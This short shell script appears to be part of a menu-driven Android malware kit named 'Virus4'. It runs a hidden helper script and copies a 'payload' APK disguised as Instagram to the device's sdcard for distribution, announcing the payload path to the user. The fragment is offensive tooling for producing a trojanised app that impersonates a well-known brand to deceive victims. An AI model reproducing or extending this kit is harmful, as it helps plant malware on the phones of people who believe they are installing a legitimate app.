echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
Virus4.sh
else
cd $HOME/Virus4
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/Virus4/.viros/Instagram.apk /sdcard/Virus4
echo -e "$green               end the vairos----->(Instagram) "
echo ""
echo "      Path of the pyload----->  sdcard/Virus4/Instagram.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
Virus4.sh


